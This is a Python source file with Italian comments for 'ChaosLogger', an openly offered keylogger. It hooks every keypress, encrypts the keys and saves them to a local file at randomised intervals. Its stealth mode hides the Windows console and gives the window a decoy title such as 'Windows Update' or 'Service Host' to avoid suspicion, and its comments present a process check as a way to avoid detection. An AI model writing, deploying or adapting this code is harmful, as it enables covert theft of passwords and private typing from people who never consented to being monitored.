import keyboard
import threading
import logging
from cryptography.fernet import Fernet
import os
import time
import ctypes
import psutil  # Libreria per verificare i processi attivi
import random  # Libreria per generare titoli casuali per il processo

class ChaosLogger:
    def __init__(self, stealth_mode=True, log_file="keylog.dat", key_file="encryption.key"):
        # Inizializza il logger con la modalità stealth, il file di log e il file della chiave di crittografia
        self.keylog_data = []  # Lista per memorizzare le sequenze di tasti catturate
        self.stealth = stealth_mode  # Flag per la modalità stealth
        self.log_file = log_file  # File per salvare le sequenze di tasti registrate
        self.key_file = key_file  # File per salvare la chiave di crittografia
        self.logging_stopped = False  # Flag per controllare lo stato della registrazione

        # Configura il logging per gestire gli errori
        logging.basicConfig(level=logging.ERROR, format='%(asctime)s %(levelname)s: %(message)s')

        # Carica o genera la chiave di crittografia
        if os.path.exists(self.key_file):
            # Carica la chiave di crittografia esistente dal file
            with open(self.key_file, 'rb') as f:
                self.encryption_key = f.read()
        else:
            # Genera una nuova chiave di crittografia e salvala su file
            self.encryption_key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(self.encryption_key)
        self.cipher_suite = Fernet(self.encryption_key)  # Crea un insieme di cifratura per la crittografia

        # Miglioramento della Modalità Stealth - nasconde la finestra della console se su Windows
        if self.stealth and os.name == 'nt':
            self._hide_console()

    def _hide_console(self):
        # Nasconde la finestra della console su Windows per funzionare in modalità stealth
        if os.name == 'nt':
            # Rinomina la finestra della console con un nome casuale per evitare sospetti
            process_name = random.choice(["System Process", "Windows Update", "Background Task", "Service Host"])
            ctypes.windll.kernel32.SetConsoleTitleW(process_name)
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # Nasconde la finestra della console
                ctypes.windll.kernel32.CloseHandle(hwnd)  # Chiude il handle alla finestra della console

    def _check_process_running(self, process_name):
        # Verifica se un determinato processo è in esecuzione (per evitare rilevamenti)
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == process_name:
                return True
        return False
                
    def start_logging(self):
        # Avvia la registrazione delle sequenze di tasti
        self.logging_stopped = False  # Resetta il flag di arresto della registrazione
        keyboard.on_press(self._capture_keystroke)  # Imposta il listener per la tastiera
        self.saver_thread = threading.Thread(target=self._log_saver, daemon=True)  # Avvia un thread separato per salvare i log
        self.saver_thread.start()

    def stop_logging(self):
        # Ferma la registrazione delle sequenze di tasti
        self.logging_stopped = True  # Imposta il flag di arresto della registrazione
        keyboard.unhook_all()  # Scollega tutti i listener della tastiera
        if self.saver_thread.is_alive():
            self.saver_thread.join()  # Attende che il thread di salvataggio finisca

    def _capture_keystroke(self, event):
        # Cattura ogni evento di pressione tasto
        if not self.logging_stopped:
            key = event.name  # Ottiene il nome del tasto premuto
            # Gestisce i tasti speciali per una migliore leggibilità (es. converte 'space' in '[SPACE]')
            if len(key) > 1:
                key = f"[{key.upper()}]"
            try:
                # Cripta il tasto catturato e lo aggiunge alla lista
                encrypted_key = self.cipher_suite.encrypt(key.encode())
                self.keylog_data.append(encrypted_key)
            except Exception as e:
                # Registra un errore se la crittografia fallisce e salva il tasto non criptato
                logging.error(f"Errore durante la crittografia: {e}")
                self.keylog_data.append(key.encode())

    def _log_saver(self):
        # Salva periodicamente le sequenze di tasti catturate nel file di log
        while not self.logging_stopped:
            if self.keylog_data:
                try:
                    # Aggiunge le sequenze di tasti criptate al file di log
                    with open(self.log_file, "ab") as f:
                        for key in self.keylog_data:
                            f.write(key + b"\n")  # Scrive ogni tasto su una nuova linea
                        self.keylog_data = []  # Svuota la lista dopo aver salvato
                except Exception as e:
                    # Registra un errore se il salvataggio fallisce
                    logging.error(f"Errore durante il salvataggio del log: {e}")
            time.sleep(random.randint(5, 15))  # Attende un intervallo di tempo casuale tra 5 e 15 secondi per evitare pattern prevedibili

# Esempio di utilizzo
if __name__ == "__main__":
    try:
        logger = ChaosLogger()  # Crea un'istanza di ChaosLogger
        logger.start_logging()  # Avvia la registrazione delle sequenze di tasti
        input("Premi Invio per fermare la registrazione...")  # Attende che l'utente prema Invio per fermare la registrazione
    except KeyboardInterrupt:
        # Gestisce l'interruzione da parte dell'utente (es. Ctrl+C)
        pass
    finally:
        # Assicura che la registrazione venga fermata correttamente
        logger.stop_logging()
        print("Registrazione fermata.")
